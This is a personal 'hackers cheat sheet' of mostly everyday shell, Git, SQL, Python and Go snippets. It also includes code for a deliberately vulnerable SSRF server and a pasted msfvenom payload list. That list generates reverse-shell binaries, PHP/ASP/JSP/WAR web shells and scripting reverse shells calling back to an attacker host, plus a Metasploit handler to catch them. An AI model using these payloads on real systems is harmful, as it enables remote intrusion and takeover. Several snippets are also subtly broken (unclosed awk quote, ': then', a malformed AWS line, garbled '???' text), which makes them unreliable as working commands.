# Cheatsheet1
HACKERS CHEAT SHEET
### Adding text to the end of each line in a file:
```
sed -e 's/$/<text to insert here>/' -i <filename>.txt
```

### Uncompressing tar files:
```
tar -xvf <filename>
```

### Adding text to the end of a file:
```
echo '<text to insert here>' >> <filename>
```

### Redirecting stdout to a file, as well as redirecting stderr to stdout:
```
<command> >out 2>&1
```

### One liner update command (Debian):
```
sudo apt-get update -y && sudo apt-get dist-upgrade -y
```

### Count directories/files within a directory:
```
tree -L 1 | tail 1
```

### grep simulator for AND operator
```
grep -E "item1.*item2" .
```

### (Athena SQL) Using if statement within a WHERE clause
```
# format:  if( condition, value_if_true, value_if_false)
WHERE if(<field_name> = '<field value>','true','false')
```

### (Athena SQL) Counting aggragated records
```
SELECT <field_name> , count(*) AS <count_field_name>
```

### (Athena SQL) Show partitions for a table
```
SHOW PARTITIONS <table>
```

### (Athena SQL) Skip the first line when creating a table for data
```
TBLPROPERTIES
(
 "skip.header.line.count"="1"
)
```

### Review open Linux ports
```
netstat -l
```

### Append text to end of file (quickly)
```
echo 'text' >> file
```

### Append text to beginning of file (quickly)
```
sed -i "1iTEXTHERE" file
```

### Quick Base64 Decode
```
# In bash:
echo <base 64 coded string here> | base64 -d
```

### Search for text within files (quickly)
```
grep -rnw . -e "<pattern>"
```

### Beginner screen commands
```
# Starting a screen:
screen -S my_screen_session_name
# List running screens:
screen -ls
# Return to running screen (if only one is running):
screen -r
# If multiple are running:
screen -r my_screen_session_name
```

### Run a detached screen command, for running commands in the background
```
screen -dmS <name> sh -c "<command>; exec bash"
```

### Search for text while ignoring case (quickly)
```
grep -i <texthere> *
```

### (Git) Git Setup Commands
```
# Configuring Git User
git config --global user.name <user>
# Clone a Git Repo
git clone <url>
```

### (Git) Start ssh-agent
```
eval "$(ssh-agent -s)"
```

### Perform a difference between two lists (Python)
```
final_list = (list(set(first_list) - set(second_list)))
```

### How to check out an existing branch into VSCode (Git)
```
git pull origin <new_branch>
git fetch origin <new_branch>
git checkout <new_branch>
```

### Check sudo version
```
sudo -V
```

### Search script.db for nmap scripts (shows type of script)
```
cat /usr/share/nmap/scripts/script.db
```

### Various awk commands
```
# Add line number to awk command
awk '{print NR,$0} file.txt
```

### (Bash) Check to see if a directory exists, then create it if it doesn't
```
if [ ! -f /home/user ]: then
  mkdir /home/user
fi
```

### (Bash) Check to see if a file exists, then create it if it doesn't
```
if [ ! -f /home/user/test.txt ]; then
    touch /home/user/test.txt
fi
```

### (Python) Handy imports for starting a script
```
import logging
import os
import json
import boto3
import time
import datetime
from botocore.exceptions import ClientError


logger = logging.getLogger()
logger.setLevel(logging.INFO)
current_date = datetime.datetime.now()
current_date_string = str(current_date)
```

### (AWS CLI) Parse S3 and place into a file
```
aws s3 ls %s --recursive | tail -n +1 | head -1" % file_name
```

### (Git) How to checkout a remote branch
```
git pull
# List current branches after pull
git branch
# Switch to branch
git checkout new branch
```

### (Git) How to commit and push
```
# Commit and comment your code
git commit -m "comment here"
# Push your code
git push
```

### (Git) How to remove deleted branches from local
```
git branch -d <branch_name>
OR
git fetch -p
```

### How to beautify large JSON files
```
cat <file_name> | python -m json.tool > <new_file_name>
```

### Output raw string from jq
```
jq --raw-output '.field,.sub_field'
```

### (VSCode) Mass Comment/Uncomment of lines in VSCode
```
Windows: Ctrl + /
Mac: Command + /
```

### (VSCode) Go to beginning of all lines
```
Mac: Ctrl + A (to select all lines), Shift + Alt + I (to put cursor at end of all lines), Home key (to go to beginning of each line)
```

### (argparse) How to use an option with no required argument
```
parser.add_argument('--fake-option', action='store_true')
select = parser.parse_args()
if select.fake-option:
    dostuff()
```

### (Bash) Create virtual environment for running Python
```
virtualenv --python=python3 venv
source venv/bin/activate
```

### (vi) vi commands
```
:w - write to file
:q (:q!) - quit file
x - deletes characters
u - undo change
dd - deletes entire line
p - paste
yy - copy current line
5yy - copy 5 current lines
J - join the next line
f - find character within a line
/ - find word within file
:%s - substitute words within the document (example: :%s/Word/word/gc) g = global, replaces each string within the file, c = confirmation
:n - move to next file
:N - move to previous file
:e - add second file to edit
:buffer - switch files
:wq - save and quit
:q! - quit without saving
```

### (Bash) Starting an Apache2 server
```
sudo apt update
sudo apt install apache2 -y
service apache2 start
```

### (Python) Iterate cleanly on JSON Keys that may or may not exist
```
if 'JSONKey' in json:
    variable = json['JSONKey']
    print(variable)
```

### (Ruby) Create vulnerable SSRF server for testing 
```
# Create a Ruby file for running a vulnerable server
vim vuln-server.rb
# Add the following content to the file:
require 'sinatra'
require 'open-uri'

set :bind, '0.0.0.0'
set :port, 80

get '/' do
  format 'RESPONSE: %s', open(params[:url]).read
end
# Install Sinatra using Ruby
gem install sinatra
# Run the server in the background
ruby vuln-server.rb
```

### (Python) Advanced setup of logging module
```
# Code to print out info within the terminal
logFormatter = '%(asctime)s - %(levelname)s - %(message)s'
logging.basicConfig(format=logFormatter, level=logging.INFO)

# Code to set the logger up
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Code to set up the logging file locally for review
output_handle = logging.FileHandler('loggertest.log')
output_handle.setLevel(logging.INFO)
logger.addHandler(output_handle)

# Code to set up the logging format for logs within the logging file
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
output_handle.setFormatter(formatter)

# Code for the handler needed for inputting the logs into the logging file
logger.addHandler(output_handle)
logger.info("Logs are contained in loggertest.log")
```

### (Python) Add timestamp function to replace print
```
original_print = print

def timestamp(*args, **kwargs):
    original_print(datetime.datetime.now(), *args, **kwargs)
print = timestamp
```

### (Bash) Change Terminal Prompt
```
export PS1='> '
```

### (Bash) Read and store input as a variable
```
# Normal Mode
echo Red or Blue? 
read color
echo $color

# Silent Mode
echo Green or Yellow?
read -s color
echo $color
```

### (Bash) Use grep with line numbers
```
grep --number file.txt
OR
grep -n file.txt
```

### (Bash) How to do a line count with grep
```
cat file.txt | grep "cool phrase" | wc -l
```

### (HTML) Create a link in HTML
```
<a href="url">linkhere</a>
```

### (Python) Generate a random string
```
import string
import random

letters = string.ascii_letters
numbers = string.digits
special_chars = string.punctuation

dummy_phrase = (''.join(random.choice(letters + numbers + special_chars) for char in range(24)))
dummy_string = dummy_phrase.replace('@','').replace('/','').replace('"','')
print(dummy_string)
```

### (Go) Code for creating initial Go project
```
package main

import (
	"fmt"
)
```

### (Go) Code for creating a function and calling it
```
package main

import (
  "fmt"
)

func testing() {
  fmt.Println("Hello World")
}

func main() {
  testing() // Call the testing function above.
}
```

### (Go) Code for defining variables
```
test_var := "Hello" // Defines a variable and adds the type based on intelligence
var greeting string = "Hello" // Defines a variable and adds it specifically
fmt.Println(test_var) // Prints the variable
fmt.Println(greeting) // Prints the variable
```

### (Go) Code for using if/else statements
```
func if_testing() {
	fmt.Println("Let's try an if statement. Say something.")
	var if_input string
	fmt.Scanln(&if_input)
	if if_input == "something" {
		fmt.Println("You said something.")
		os.Exit(0)
	} else if if_input == "nothing" {
		fmt.Println("You said nothing.")
		os.Exit(0)
	} else if if_input == "random" {
		fmt.Println("You said", if_input)
		os.Exit(0)
	} else {
		fmt.Println("You said something else.")
	}
}
```

### (Go) How to print output from AWS DescribeInstances API Call (AWS SDK for Go v1)
```
func ec2_test() {
	// Standard session declaration for using AWS SDK for Go v1
	session := session.Must(session.NewSessionWithOptions(session.Options{
		SharedConfigState: session.SharedConfigEnable,
	}))

	ec2_client := ec2.New(session) // Using the standard session declaration
	output, err := ec2_client.DescribeInstances(nil)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Let's describe some instances.")
	//	fmt.Println(output)
	for _, reserv := range output.Reservations { //This is how you parse the JSON content initially.
		fmt.Println(reserv)                    // You can print out the variable here.
		fmt.Println(reserv.Instances)          // For subfields, you can use this format.
		for _, bdm := range reserv.Instances { // Can print out nested here as well.
			fmt.Println(bdm.BlockDeviceMappings)
		}
	}
}
```

### (Go) Cross compile Go code to a Windows exe file from Linux/MacOS
```
GOOS=windows GOARCH=amd64 go build -o go_code.exe go_code.go
```

### (Go) How to use AND/OR/NOT in Go
```
// AND
if a && b {
	fmt.Println("Both a and b are true")
}
// OR
if a || b {
	fmt.Println("One of a and b is true")
}
// NOT
if !a {
	fmt.Println("a is false")
}
```

### (Windows cmd) How to kill processes
```
taskkill /F /IM "taskname.exe"


List payloads

msfvenom -l

Binaries

Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

Web Payloads

PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

Scripting Payloads

Python

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

Bash

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl

msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

Shellcode

For all shellcode see ???msfvenom ???help-formats??? for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

Linux Based Shellcode

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Windows Based Shellcode

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Mac Based Shellcode

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Handlers

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z

Once the required values are completed the following command will execute your handler ??? ???msfconsole -L -r ???

```
